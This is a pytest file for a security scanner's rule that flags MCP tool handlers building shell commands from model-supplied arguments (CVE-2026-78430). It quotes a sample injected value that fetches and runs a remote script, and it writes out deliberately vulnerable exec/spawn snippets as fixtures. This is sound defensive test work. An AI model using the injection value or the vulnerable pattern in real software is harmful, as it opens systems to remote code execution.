"""CVE-2026-78430 — a tool handler composing a shell command from its arguments.

`mcp-ffmpeg-helper` 0.1.0 / 0.1.1 / 0.2.1 interpolates the `format` tool argument
straight into a shell string inside `handleToolCall`
(`src/tools/handlers.ts`), so `mp4; curl attacker.sh | sh` runs as a second
command. CWE-77 / CWE-78.

The surface is the request path, not the launch path: `AAK-MCP-002` and the
`AAK-MCP-STDIO-CMD-INJ-*` family all inspect the *configured server command*
before a process starts. This one fires on what the handler does with a value
the model supplied.

The negative fixture carries more weight here than the positive one. The rule's
whole claim is that it distinguishes a composed shell string from an argv array,
and `execFile('ffmpeg', ['-i', input, '-f', format])` is the fix its own
remediation asks for — so if the rule fired on that too it would be reporting
"you called a process API", which `AAK-TAINT-001` already does.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from agent_audit_kit.models import Category, Severity
from agent_audit_kit.rules.builtin import RULES
from agent_audit_kit.scanners.typescript_pattern_scan import scan

REPO_ROOT = Path(__file__).resolve().parent.parent
FIXTURES = REPO_ROOT / "tests" / "fixtures" / "cves" / "cve-2026-78430-mcp-ffmpeg-helper"
LEDGER = REPO_ROOT / "CHANGELOG.cves.md"

RULE = "AAK-MCP-TOOL-ARG-OSCMD-001"
GENERIC = "AAK-TAINT-001"


def _ids(path: Path) -> list[str]:
    findings, _ = scan(path)
    return [f.rule_id for f in findings]


# ---------------------------------------------------------------------------
# Registry
# ---------------------------------------------------------------------------


def test_rule_is_registered_with_the_agreed_shape() -> None:
    rule = RULES[RULE]
    assert rule.severity is Severity.CRITICAL
    assert rule.category is Category.TOOL_POISONING
    assert rule.sarif_name == "McpToolArgOsCommand"
    assert "CVE-2026-78430" in (rule.cve_references or [])


def test_rule_explains_why_it_outranks_its_cvss() -> None:
    """CVSS 3.1 scores this 5.3 because the vector needs a local attacker.

    In an agent pipeline the local caller is the model, so the reasoning for
    CRITICAL has to be legible to someone reading a SARIF report who never sees
    this repo. It belongs in the rule text, not a source comment.
    """
    description = RULES[RULE].description.lower()
    assert "5.3" in description
    assert "local" in description
    assert "model" in description


def test_rule_maps_to_the_tool_param_shell_injection_slot() -> None:
    """ADV-INJECT-04 is literally "Tool Param Shell Injection"."""
    rule = RULES[RULE]
    assert rule.adversa_references == ["ADV-INJECT-04"]
    assert rule.owasp_mcp_references == ["MCP04:2025"]
    assert rule.owasp_agentic_references == ["ASI05"]


def test_remediation_names_argv_and_an_allowlist() -> None:
    remediation = RULES[RULE].remediation.lower()
    assert "argv" in remediation or "array" in remediation
    assert "allowlist" in remediation


# ---------------------------------------------------------------------------
# Detection
# ---------------------------------------------------------------------------


def test_vulnerable_fixture_fires() -> None:
    assert RULE in _ids(FIXTURES / "vulnerable")


def test_negative_fixture_is_quiet() -> None:
    """argv + an allowlist. The rule going quiet here is the point."""
    assert RULE not in _ids(FIXTURES / "negative")


def test_negative_fixture_is_quiet_about_everything() -> None:
    """Not merely quiet for this rule — the safe handler is clean.

    A negative fixture that still tripped some other rule would make it hard to
    tell, later, whether this one had actually gone quiet.
    """
    assert _ids(FIXTURES / "negative") == []


def test_one_defect_is_reported_once(tmp_path: Path) -> None:
    """The generic sink rule is suppressed where this one fires.

    `AAK-TAINT-001` matches any `child_process` call in an MCP file, so without
    suppression the composed-shell line would carry two CRITICAL findings for a
    single defect.
    """
    (tmp_path / "server.ts").write_text(
        "import { McpServer } from '@modelcontextprotocol/sdk/server/mcp.js';\n"
        "import { execSync } from 'child_process';\n"
        "const server = new McpServer({ name: 'x', version: '1' });\n"
        "export async function handleToolCall(name: string, args: any) {\n"
        "  execSync(`ffmpeg -f ${args.format} out.mp4`);\n"
        "}\n",
        encoding="utf-8",
    )
    findings, _ = scan(tmp_path)
    on_sink_line = sorted(f.rule_id for f in findings if f.line_number == 5)
    assert on_sink_line == [RULE], on_sink_line


def test_generic_rule_still_fires_where_this_one_does_not(tmp_path: Path) -> None:
    """Guard the guard: suppression must be scoped to the line, not global.

    Without this, deleting the whole generic branch would still pass the test
    above.
    """
    (tmp_path / "server.ts").write_text(
        "import { McpServer } from '@modelcontextprotocol/sdk/server/mcp.js';\n"
        "import { exec } from 'child_process';\n"
        "const server = new McpServer({ name: 'x', version: '1' });\n"
        "export function helper(cmd: string) { exec(cmd); }\n",
        encoding="utf-8",
    )
    assert GENERIC in _ids(tmp_path)


@pytest.mark.parametrize(
    "snippet,should_fire",
    [
        ("execSync(`ffmpeg -f ${format}`)", True),
        ('exec("ffmpeg -f " + format)', True),
        ("exec(base + format)", True),
        ("spawn('ffmpeg', args, { shell: true })", True),
        # The safe shapes. argv arrays and a default (false) shell.
        ("execFile('ffmpeg', ['-i', input, '-f', format])", False),
        ("spawn('ffmpeg', ['-i', input])", False),
        ("execFileSync('ffmpeg', ['-version'])", False),
        # A constant command composes nothing.
        ("execSync('ffmpeg -version')", False),
    ],
)
def test_composed_versus_argv(tmp_path: Path, snippet: str, should_fire: bool) -> None:
    (tmp_path / "handlers.ts").write_text(
        "import { CallToolRequestSchema } from '@modelcontextprotocol/sdk/types.js';\n"
        "export async function handleToolCall(name: string, args: any) {\n"
        f"  {snippet};\n"
        "}\n",
        encoding="utf-8",
    )
    assert (RULE in _ids(tmp_path)) is should_fire


def test_shell_true_on_a_later_line_is_still_caught(tmp_path: Path) -> None:
    """Real code formats options across lines."""
    (tmp_path / "handlers.ts").write_text(
        "import { CallToolRequestSchema } from '@modelcontextprotocol/sdk/types.js';\n"
        "export async function handleToolCall(name: string, args: any) {\n"
        "  spawn('ffmpeg', ['-f', args.format], {\n"
        "    shell: true,\n"
        "  });\n"
        "}\n",
        encoding="utf-8",
    )
    findings, _ = scan(tmp_path)
    hits = [f for f in findings if f.rule_id == RULE]
    assert len(hits) == 1, [f.line_number for f in hits]
    assert hits[0].line_number == 3, "the finding belongs on the call, not the option"


def test_a_plain_server_without_tool_dispatch_is_not_enough(tmp_path: Path) -> None:
    """The rule claims a TOOL HANDLER composed the command.

    A file that defines a server but dispatches no tool call cannot support that
    claim, so the generic sink rule owns it instead.
    """
    (tmp_path / "server.ts").write_text(
        "import { McpServer } from '@modelcontextprotocol/sdk/server/mcp.js';\n"
        "import { execSync } from 'child_process';\n"
        "const server = new McpServer({ name: 'x', version: '1' });\n"
        "execSync(`echo ${process.env.HOME}`);\n",
        encoding="utf-8",
    )
    ids = _ids(tmp_path)
    assert RULE not in ids
    assert GENERIC in ids


# ---------------------------------------------------------------------------
# Ledger
# ---------------------------------------------------------------------------


def test_disposition_is_recorded_in_the_ledger() -> None:
    text = LEDGER.read_text(encoding="utf-8")
    assert "CVE-2026-78430" in text
    assert RULE in text
